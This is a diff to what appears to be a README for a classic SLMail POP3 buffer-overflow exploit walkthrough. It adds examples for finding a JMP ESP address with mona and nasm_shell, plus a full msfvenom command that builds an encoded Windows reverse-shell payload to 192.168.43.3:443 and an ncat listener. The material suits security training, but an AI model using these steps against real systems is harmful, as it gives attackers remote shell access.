@@ -18,12 +18,26 @@ in repo).
 * Find a return address - using Mona.py in the Immunity debugger you should look for module that is not protected by DEP/ASLR and has a memory range that does not cotain bad characters.
 Run "!mona modules" in Immunity to find one.
 Run nasm_shell.rb in kali in order to find an opcode that is equivilent to JMP ESP command.
+
+Example:
+root@Pizduk:/tmp# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp esp
+00000000  FFE4              jmp esp
+
 Search for this opcode in all sections of the .dll file that found in modules by this command in Immunity:
-"!mona find -s "<OPCODE_IN_HEXA>" (Ex.\xff\xe4) -m <.DLL_FILE> (Ex. slmfc.dll)".
+"!mona find -s "[OPCODE_IN_HEXA]" -m <.DLL_FILE>".
+
+Example:
+!mona find -s "\xff\xe4" -m slmfc.dll
+
 Choose one that doesnt contain bad chars (double check that inside the debugger - Ex. address like 0x5f4a358f).
 * Edit the exploit and add this address instead of EIP (B's) place (See slmail_pop3_return_address.py in repo)
 * Place a breakpoint in this address and check it actually reaches it.
-* Generate a shellcode using MSFVENOM (msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKERS_IP> LPORT=<ATTACKERS_PORT> EXITFUNC=thread -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "<BAD_CHARS>" (ex. "\x00\x0a\x0d")).
+* Generate a shellcode using MSFVENOM (msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACKERS_IP] LPORT=[ATTACKERS_PORT] EXITFUNC=thread -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "<BAD_CHARS>").
+
+Example:
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.3 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+
 * Place this shellcode in the exploit POC and make sure to add NOP as padding for the decoder (See slmail_pop3_shellcode.py in repo). 
-* Start a listener on attackers machine and get a shell (ncat -lvnp <LISTENING_PORT>).
+* Start a listener on attackers machine and get a shell (ncat -lvnp [LISTENING_PORT]).
 -------------------------------------------------------------------------------------------------------------------------------
